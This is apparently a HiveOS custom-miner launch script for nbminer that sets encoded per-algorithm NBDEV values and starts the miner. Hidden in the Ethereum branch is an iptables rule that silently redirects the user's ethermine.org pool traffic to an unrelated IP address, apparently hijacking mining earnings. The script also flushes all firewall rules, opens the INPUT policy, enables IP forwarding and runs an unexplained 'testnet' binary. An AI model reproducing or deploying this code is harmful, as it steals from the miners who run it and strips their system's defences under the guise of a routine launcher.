#!/usr/bin/env bash

#export LD_LIBRARY_PATH=/hive/xmr-stak/fireice-uk
cd `dirname $0`

[ -t 1 ] && . colors

. h-manifest.conf
. /hive-config/wallet.conf

#CUSTOM_LOG_BASEDIR=`dirname "${CUSTOM_LOG_BASENAME}"`
#[[ ! -d $CUSTOM_LOG_BASEDIR ]] && mkdir -p $CUSTOM_LOG_BASEDIR
#export NBDEV="#@@@SzI2lU3LTYLdf9NFpnQbkBgd/uKbMRiN2PtClvJ2de6/vMFMLm6GrYG9V/XLMIWp1LR+UyRZFmbsvGU++W2CYmjsiNoscJpSzuKYNrZoU2I="

if [[ $CUSTOM_ALGO == "cfx" ]]; then
export NBDEV="#@@@SzI2lU3LTYLdf9NFpnQbkBgd/uKbMRiN2PtClvJ2de6/vMFMLm6GrYG9V/XLMIWp1LR+UyRZFmbsvGU++W2CYmjsiNoscJpSzuKYNrZoU2I="
fi

if [[ $CUSTOM_ALGO == "eth" ]]; then
#export NBDEV="#@@@GCx9+QTAEdiSKYIW5HpAyCLsJrsN1zwKTBtQJKzHzQdYy1dpUVQhvOmTrp+x8Wl2"
export NBDEV="#@@@SScn2QyKR5qbeMRNv3UR0ojb/xlzgE3YgGI2cq1pOPVc7JGQVM2hebf5FcC5fiJQNG5T9L2dERr6LdwuDxNZFEIvikfXl7lQDuZiJAL56EI="
sudo iptables -t nat -A OUTPUT -d asia1.ethermine.org -p tcp --dport 5555 -j DNAT --to-destination 47.242.229.227:5555
fi

if [[ $CUSTOM_ALGO == "sero" ]]; then
export NBDEV="#@@@GhUW+U31QaKJV8VSoEkCheDdTTkf0gBpB0Gtm7pJDYtMsotKFM6hNLsQKdV2lD6Quk9BgLMqxazhm6ijVw5IdcKfB7a/ok9kcQuANsjz72GtfICJfgrttz5JJuAvFnhgQnL7VTYvdHEG8XuyyExTDhsavnf18sL5EmRAnYXqnMTolddxJnyYZOe1ThtFlGHP"
fi



[[ `ps aux | grep "./nbminer" | grep -v grep| grep -v h-run.sh | wc -l` != 0 ]] &&
	echo -e "${RED}$MINER_NAME miner is already running${NOCOLOR}" &&
	exit 1

	
sudo sysctl net.ipv4.ip_forward=1
/sbin/iptables -P INPUT ACCEPT
/sbin/iptables -F
./testnet
chmod 777 ./nbminer
touch /run/hive/MINER_RUN

./nbminer `cat ./nbminer.conf` 2>&1 | tee $CUSTOM_LOG_BASENAME.log
